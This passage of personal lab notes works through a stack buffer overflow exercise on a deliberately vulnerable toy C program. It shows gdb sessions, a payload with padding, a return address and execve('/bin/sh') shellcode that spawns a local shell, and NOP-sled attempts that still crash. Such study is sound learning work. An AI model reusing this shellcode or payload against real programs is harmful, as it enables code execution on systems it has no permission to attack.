    at silly.c:14
14      in silly.c
(gdb) c
Continuing.
process 7732 is executing new program: /usr/bin/bash
Error in re-setting breakpoint 2: Function "vuln" not defined.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, 0x000055555556e9a8 in main ()
(gdb) c
Continuing.
sh-5.2$ cal
[Detaching after fork from child process 7736]
     August 2024
Su Mo Tu We Th Fr Sa
             1  2  3
 4  5  6  7  8  9 10
11 12 13 14 15 16 17
18 19 20 21 22 23 24
25 26 27 28 29 30 31
```

- __EUREKA! I did it!__

- In ubuntu it's a little bit different.
- The difference is that it needs 44 bytes of `'A'` padding, and a different address which can be discovered with `x/x $ebp+0xc`:

```sh
gef➤  r 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xac\xce\xff\xff'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
Starting program: /home/noobuntu/nightmare/bof/shellcodin/bin/vulnerable 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xac\xce\xff\xff'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
/bin/bash: line 1: warning: command substitution: ignored null byte in input

gef➤  c
Continuing.

Breakpoint 2, vuln (n=0x5, str=0xffffd224 'A' <repeats 44 times>, "\254\316\377\377AAAA\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\001\061\333̀\350\344\377\377\377/bin/sh") at vulnerable.c:17
17        strcpy(buf,str);
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x5
$ebx   : 0x080ed000  →  <_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al
$ecx   : 0x0
$edx   : 0xffffd222  →  0x41410035 ("5"?)
$esp   : 0xffffce78  →  0x00000001
$ebp   : 0xffffcea0  →  0xffffceb8  →  0x00000001
$esi   : 0xffffd224  →  0x41414141 ("AAAA"?)
$edi   : 0x1
$eip   : 0x080497d8  →  <vuln+0019> push DWORD PTR [ebp+0xc]
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffce78│+0x0000: 0x00000001   ← $esp
0xffffce7c│+0x0004: 0x080ed000  →  <_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al
0xffffce80│+0x0008: 0x0805155a  →  <strtol+000a> add ebx, 0x9baa6
0xffffce84│+0x000c: 0x080ed000  →  <_GLOBAL_OFFSET_TABLE_+0000> add BYTE PTR [eax], al
0xffffce88│+0x0010: 0x080507f0  →  <atoi+0020> add esp, 0x18
0xffffce8c│+0x0014: 0xffffd222  →  0x41410035 ("5"?)
0xffffce90│+0x0018: 0x00000000
0xffffce94│+0x001c: 0x0000000a ("\n"?)
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80497c6 <vuln+0007>      call   0x8049650 <__x86.get_pc_thunk.bx>
    0x80497cb <vuln+000c>      add    ebx, 0xa3835
    0x80497d1 <vuln+0012>      mov    DWORD PTR [ebp-0x8], 0x0
 →  0x80497d8 <vuln+0019>      push   DWORD PTR [ebp+0xc]
    0x80497db <vuln+001c>      lea    eax, [ebp-0x28]
    0x80497de <vuln+001f>      push   eax
    0x80497df <vuln+0020>      call   0x8049028
    0x80497e4 <vuln+0025>      add    esp, 0x8
    0x80497e7 <vuln+0028>      jmp    0x8049806 <vuln+71>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:vulnerable.c+17 ────
     12
     13  void vuln(int n, char * str){
     14    int i = 0;
     15    char buf[32];
     16
                        // str=0xffffceac  →  [...]  →  0x41414141, buf=0xffffce78  →  0x00000001
●→   17    strcpy(buf,str);
     18
     19    while( i < n ){
     20      printf("%d %s\n",i++, buf);
     21    }
     22
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vulnerable", stopped 0x80497d8 in vuln (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80497d8 → vuln(n=0x5, str=0xffffd224 'A' <repeats 44 times>, "\254\316\377\377AAAA\353\027^1\300PV1Ұ\v\211\363\211\341̀1\300\260\001\061\333̀\350\344\377\377\377/bin/sh")
[#1] 0x8049846 → main(argc=0x3, argv=0xffffcff4)
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  c
Continuing.
process 4235 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: Function "vuln" not defined.
Error in re-setting breakpoint 2: No source file named /home/noobuntu/nightmare/bof/shellcodin/vulnerable.c.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
$ id
[Detaching after vfork from child process 4241]
uid=1000(noobuntu) gid=1000(noobuntu) groups=1000(noobuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)
$
[Inferior 1 (process 4235) exited normally]
```


## Outside of GDB and NOP sledding

- Using our previous exploit outside of `gdb` will fail:

```sh
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
```

- Simple explanation for this is that without `gdb` addresses are now positioned higher than what they used to be.
- In other words memory address layout is different, thus segmentation fault occurs.
- Visually:

```sh

    with gdb                 without gdb

  .------------.           .------------.
  |            |           |            |
  | gdb junk   |           :            :  
  |            |            
  :            :           :            :
                           |            |
  :            :           | shell code |
  |            |           | padding    |
  |            |           | ret addr   |--.
  |            |           :            :  |
  | shell code | <-.                     <-'
  | padding    |   |                            
  | ret addr   |---'
```

- However, this can be corrected using NOP sled:


```sh

    without nops           with nops         

  .------------.         .------------.
  |            |         |            |
  :            :         :            :

  :            :         :            :
  |            |         |            |
  | shell code |         | shell code |
  | padding    |         | nop        |
  | ret addr   |--.      | nop        |
  :            :  |      | nop        |
                <-'      | nop        |<-.
                         | padding    |  |
                         | ret addr   |--'
```

- So, it looks something like this:


```sh
                                             .-----------------------.
                                             |                       | 
                                             |                       v
   ./vulnerable 5 <--------padding-----><address-of-nopsled><padding><nop-sled><shell code>
```

- However I cant seem to find correct number of NOPs that I need to add:

```sh
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x10+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x20+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x30+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x40+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x50+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
$ ./bin/silly 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x64\xcf\xff\xff'+b'A'*4+b'\x90'*0x60+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Segmentation fault (core dumped)
```

- Trying the same in Ubuntu virtual machine (disabled ASLR) results in:

```sh
noobuntu@noobuntu-VirtualBox:~/bof/shellcodin$ ./bin/vulnerable 5 `python3 -c "import sys; sys.stdout.buffer.write(b'A'*44+b'\xac\xce\xff\xff'+b'A'*4+b'\x90'*0x60+b'\xeb\x17\x5e\x31\xc0\x50\x56\x31\xd2\xb0\x0b\x89\xf3\x89\xe1\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'+b'\x00')"`
-bash: warning: command substitution: ignored null byte in input
Illegal instruction (core dumped)
```

- Find out what this means:

```sh
noobuntu@noobuntu-VirtualBox:~/bof/shellcodin$ sudo dmesg | tail
[ 1872.554529] traps: vulnerable[4445] trap invalid opcode ip:ffffceb6 sp:ffffceb8 error:0
[ 1890.040692] traps: vulnerable[4460] trap invalid opcode ip:ffffceb6 sp:ffffceb8 error:0
```
